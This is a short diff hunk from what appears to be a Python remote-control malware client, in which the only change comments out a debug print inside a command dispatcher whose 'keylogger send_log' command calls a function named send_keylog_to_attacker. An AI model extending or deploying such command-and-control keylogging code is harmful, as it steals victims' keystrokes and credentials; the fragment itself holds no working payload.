@@ -48,7 +48,7 @@ def main():
         result = result.split(" ")
 
         if result and len(result) >= 2:
-            print(result)
+            # print(result)
             if result[0] == "keylogger":
                 if result[1] == "send_log":
                     instructions.send_keylog_to_attacker()
